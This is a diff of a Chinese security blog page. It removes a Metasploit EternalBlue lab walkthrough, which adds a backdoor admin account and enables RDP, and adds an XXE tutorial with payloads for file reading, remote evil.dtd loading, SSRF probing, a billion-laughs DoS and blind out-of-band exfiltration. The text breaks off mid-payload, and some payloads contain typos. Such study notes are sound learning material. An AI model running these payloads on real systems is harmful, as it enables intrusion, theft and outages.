@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Metasploit 渗透练习 · Ywc&#39;s blog</title>
+    <title>XXE漏洞总结 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Metasploit 渗透练习</a>
+                <a href="#" class="post-name">XXE漏洞总结</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Metasploit 渗透练习
+            XXE漏洞总结
             <!-- 404 -->
             
         </h1>
@@ -261,18 +261,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">585</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">6</span> / Reading time: <span class="post-count">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/09/29</span>
+                    <span class="post-intro-time">2018/11/19</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,68 +396,120 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>书到用时方恨少，还是要勤加练习才能应对各种比赛。</p>
-<h2 id="渗透测试环境准备"><a href="#渗透测试环境准备" class="headerlink" title="渗透测试环境准备"></a>渗透测试环境准备</h2><p>准备一台虚拟x64的windows7和一台kali机，两个都要设置成桥接模式。</p>
-<p>win7要打开网络共享</p>
-<p><img src="/2018/09/29/msf/1.png" alt="msf"></p>
-<p>看到上面这样子，就是成功了</p>
-<p>之后这台虚拟机就可以不用理它了，开着就好.</p>
-<h2 id="开始入侵"><a href="#开始入侵" class="headerlink" title="开始入侵"></a>开始入侵</h2><p>首先更新一下metasploit</p>
-<font color="red">msfupdate</font>
-
-<p>注意，最新版本的metasploit会提示<br><strong>msfupdate is no longer supported when Metasploit is part of the operating system. Please use ‘apt update; apt install metasploit-framework’</strong></p>
-<p>输入<font color="red">apt update &amp;&amp; apt install metasploit-framework</font> 更新系统。</p>
-<h3 id="信息收集—扫描局域网内的机器ip地址"><a href="#信息收集—扫描局域网内的机器ip地址" class="headerlink" title="信息收集—扫描局域网内的机器ip地址"></a>信息收集—扫描局域网内的机器ip地址</h3><p>一般使用nmap，也可以使用<a href="http://www.freebuf.com/sectool/118574.html" target="_blank" rel="noopener">xerosploit</a></p>
-<p>扫描存活主机：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.31.0/24</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2018/09/29/msf/2.png" alt="msf"></p>
-<p>发现使用vmware开的windows7虚拟机的ip地址</p>
-<p>扫描该主机存活端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.181</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2018/09/29/msf/3.png" alt="msf"></p>
-<p>发现开放445端口，OK，可以利用永恒之蓝漏洞进行攻击。</p>
-<h3 id="使用meatsploit攻击"><a href="#使用meatsploit攻击" class="headerlink" title="使用meatsploit攻击"></a>使用meatsploit攻击</h3><ul>
-<li>登录kali,启动meatsploit: <font color="red">msfconsole</font></li>
+        <h2 id="xml基础知识"><a href="#xml基础知识" class="headerlink" title="xml基础知识"></a>xml基础知识</h2><ul>
+<li>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</li>
+<li>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</li>
 </ul>
-<p><img src="/2018/09/29/msf/4.png" alt="msf"></p>
+<p><img src="/2018/11/19/XXE漏洞学习/1.png" alt="XXE漏洞总结"></p>
+<p>简单的实例：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=”<span class="number">1.0</span>″<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don’t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>文档的第一行是一个应该经常包含的XML申明，它定义了XML文档的版本号，在这个例子中表示文档将使用XML1.0的规范<code>&lt;?xml version=”1.0″?&gt;</code></p>
+<p>下一行定义了文档里面的第一个元素(element)，也称第一个元素为根元素:  <note></note></p>
+<p>再下面定义了根元素的四个子元素(分别是to, from, heading,和body): <to>Tove</to> <from>Jani</from> <heading>Reminder</heading> <body>Don’t forget me this weekend!</body></p>
+<p>最后一行定义了根元素的结束标志 ，所有的XML元素都必须要有一个结束标志。</p>
+<h2 id="DTD的概念"><a href="#DTD的概念" class="headerlink" title="DTD的概念"></a>DTD的概念</h2><p>DTD文档类型定义，是一类可定义合法的XML文档构建模块。可以认为DTD定义了一种针对XML的格式描述，任何一个XML文件都可以引用。</p>
+<p><img src="/2018/11/19/XXE漏洞学习/2.png" alt="XXE漏洞总结"></p>
+<p>XML提供了一个独立的运用程序的方法来共享数据.。使用DTD，不同的组中的人就能够使用共同的DTD来交换数据。你的应用程序可以使用这个标准的DTD来验证你接受到的数据是有效的。</p>
+<p>上面引用过的那个XML转换成DTD的样式是这样：</p>
+<p><img src="/2018/11/19/XXE漏洞学习/3.png" alt="XXE漏洞总结"></p>
+<p>DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<p>1.内部声明：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code> eg: &lt;!DOCTYOE test any&gt;</p>
+<p>完整实例：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT to      (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT from    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT body    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>2.外部声明（引用外部DTD）：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; ex:&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></p>
+<p>完整实例：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>而note.dtd的内容为:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">note</span> (<span class="attr">to</span>,<span class="attr">from</span>,<span class="attr">heading</span>,<span class="attr">body</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">to</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">from</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">heading</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">body</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+<p>实体又分为一般实体和参数实体</p>
 <ul>
-<li>搜索永恒之蓝模块：<font color="red">search ms17-010</font></li>
+<li>1.一般实体的声明语法:&lt;!ENTITY 实体名 “实体内容“&gt;</li>
 </ul>
-<p><img src="/2018/09/29/msf/5.png" alt="msf"></p>
-<p>这里可以得到两个工具，其中<code>auxiliary/scanner/smb/smb_ms17_010</code>是永恒之蓝扫描模块, <code>exploit/windows/smb/ms17_010_eternalblue</code>是永恒之蓝攻击模块，一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。</p>
+<p>引用实体的方式：&amp;实体名；</p>
 <ul>
-<li>使用检测模块：<font color="red">use auxiliary/scanner/smb/smb_ms17_010 </font>             </li>
+<li>2.参数实体只能在DTD中使用，参数实体的声明格式： &lt;!ENTITY % 实体名 “实体内容“&gt;</li>
 </ul>
-<font color="red">show options</font>       //show options或者options，查看需要填写的参数,其中标红处如果是yes，表示这行参数必须填写，如果是no，就是选填，其中有LHOST和RHOST是空,需要填写攻击目标主机的信息。<br><br>- 设置目标IP或网段：<font color="red">set RHOSTS 192.168.31.181</font>
-
-<ul>
-<li>执行扫描：<font color="red">run</font></li>
+<p>引用实体的方式：%实体名；</p>
+<p>1.内部实体声明:&lt;!ENTITY 实体名称 “实体的值”&gt; ex:&lt;!ENTITY eviltest “eviltest”&gt;</p>
+<p>完整实例:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY writer "Bill Gates"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY copyright "Copyright W3School.com.cn"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>2.外部实体声明:&lt;!ENTITY 实体名称 SYSTEM “URI”&gt;</p>
+<p>完整实例:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="XXE的攻击与危害"><a href="#XXE的攻击与危害" class="headerlink" title="XXE的攻击与危害"></a>XXE的攻击与危害</h2><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站。</p>
+<h3 id="构造外部外部实体注入的方法"><a href="#构造外部外部实体注入的方法" class="headerlink" title="构造外部外部实体注入的方法"></a>构造外部外部实体注入的方法</h3><p>1.直接通过DTD外部实体声明</p>
+<p>xml内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;passwd;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>2.通过DTD文档引入外部DTD文档，再引入外部实体声明<br>xml内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">                &lt;!ENTITY % f SYSTEM "http://www.m03.com/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">                %d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aaa</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">aaa</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>DTD文件内容</p>
+<p><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
+<p>3.通过DTD外部实体声明引入外部实体声明<br>xml内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml verstion=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">                &lt;!ENTITY f SYSTEM "http://www.m03.com/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>DTD文件内容</p>
+<p><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
+<p>支持的协议有：</p>
+<p><img src="/2018/11/19/XXE漏洞学习/4.png" alt="XXE漏洞总结"></p>
+<p>PHP在安装扩展以后还能支持的协议：</p>
+<p><img src="/2018/11/19/XXE漏洞学习/5.png" alt="XXE漏洞总结"></p>
+<h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a><strong>XXE的危害</strong></h3><ul>
+<li>读取任意文件</li>
+<li>命令执行</li>
+<li>内网探测/SSRF</li>
+<li>攻击内网网站</li>
+<li>DDOS攻击</li>
 </ul>
-<p>显示<strong>Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)</strong> 证明可以使用永恒之蓝进行攻击。</p>
-<p><img src="/2018/09/29/msf/6.png" alt="msf"></p>
-<ul>
-<li><p>使用攻击模块：<font color="red">use exploit/windows/smb/ms17_010_eternalblue</font>  </p>
-</li>
-<li><p>查看需要填写的参数：<font color="red">show options</font>                                   </p>
-</li>
-<li><p>设置攻击目标ip <font color="red">set RHOSTS 192.168.31.181</font></p>
-</li>
-<li><p>执行攻击 <font color="red">exploit</font></p>
-</li>
-</ul>
-<p><img src="/2018/09/29/msf/7.png" alt="msf"></p>
-<p><img src="/2018/09/29/msf/8.png" alt="msf"></p>
-<p>如图可见，攻击成功，之后就可以通过Shell对目标机进行控制。</p>
-<h3 id="通过Shell-对靶机进行控制"><a href="#通过Shell-对靶机进行控制" class="headerlink" title="通过Shell 对靶机进行控制"></a>通过Shell 对靶机进行控制</h3><p>创建用户名密码 blue/blue <code>net user blue blue /add</code></p>
-<p>将用户blue添加入管理组  <code>net localgroup administrators blue /add</code></p>
-<p>开启远程桌面功能  <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p>
-<p>Kali远程桌面连接Win7  <code>rdesktop 192.168.31.181:3389</code></p>
+<p>1.<strong>读取任意文件</strong></p>
+<p><code>有回显</code></p>
+<p>XML.php</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$xml = <span class="string">&lt;&lt;&lt;EOF</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version = <span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;f;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问XML.php可以读取etc/passwd文件内容</p>
+<p><code>无回显</code></p>
+<p>当页面没有回显的话，可以将文件内容发送到远程服务器，然后读取。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml verstion=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">                &lt;!ENTITY % f SYSTEM "http://www.m03.com/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">                 %f;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br></pre></td></tr></table></figure>
+<p>远程服务器的evil.dtd文件内容</p>
+<p><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
+<p>2.<strong>命令执行</strong></p>
+<p>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$xml = <span class="string">&lt;&lt;&lt;EOF</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version = <span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY f SYSTEM "except://ls"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;f;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>3.<strong>内网探测/SSRF</strong></p>
+<p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://192.168.0.100:80"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该CASE是探测192.168.0.100的80端口，通过返回的“Connection refused”可以知道该81端口是close还是open.</p>
+<p>4.<strong>攻击内网网站</strong></p>
+<p><img src="/2018/11/19/XXE漏洞学习/6.png" alt="XXE漏洞总结"></p>
+<p>攻击内网struts2网站，远程执行系统命令。</p>
+<p>5.<strong>DDOS攻击</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml  version = <span class="string">"1.0"</span> ？&gt; </span></span><br><span class="line"><span class="php"> &lt;!DOCTYPE  LOLZ  [ </span></span><br><span class="line"><span class="php"> &lt;!ENTITY  LOL  <span class="string">"&gt; </span></span></span><br><span class="line"><span class="php"> &lt;!ELEMENT LOLZ  (<span class="comment">#PCDATA)&gt; </span></span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol1  <span class="string">" &gt; "</span>LOL<span class="string">" &gt; </span></span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol2  <span class="string">"＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;＆lol1;"</span> &gt; </span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol3  <span class="string">"＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;＆lol2;"</span> &gt; </span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol4  <span class="string">"＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;＆lol3;"</span> &gt; </span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol4  <span class="string">"＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;＆lol4;"</span> &gt; </span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol6  <span class="string">"＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;"</span> &gt; </span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol7  <span class="string">"＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;"</span> &gt; </span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol8  <span class="string">"＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;"</span> &gt; </span></span><br><span class="line"><span class="php"> &lt;!ENTITY  lol9  <span class="string">"＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;"</span> &gt; </span></span><br><span class="line"><span class="php"> ]&gt; </span></span><br><span class="line"><span class="php"> &lt;lolz &gt; ＆lol9; &lt;/ lolz &gt;</span></span><br></pre></td></tr></table></figure>
+<p>当XML解析器加载这个文档时，它会看到它包含一个包含文本＆lol9;的根元素lolz。不过，＆lol9; 是一个定义的实体，扩展为包含十个＆lol8;”的字符串 字符串。每个＆lol8; 字符串是一个定义的实体，扩展为十个＆lol7; 字符串等等。在所有的实体扩展处理之后，这个小的（&lt;1 KB）的XML块实际上将包含10 9 = 10 亿个lol，占用了几乎3 GB的内存。</p>
+<h2 id="blind-xxe"><a href="#blind-xxe" class="headerlink" title="blind xxe"></a>blind xxe</h2><p>当普通外部实体攻击得不到回显的时候，就可以使用带外数据通道。利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///C:/1.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://192.168.150.1/evil.xml"&gt;</span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 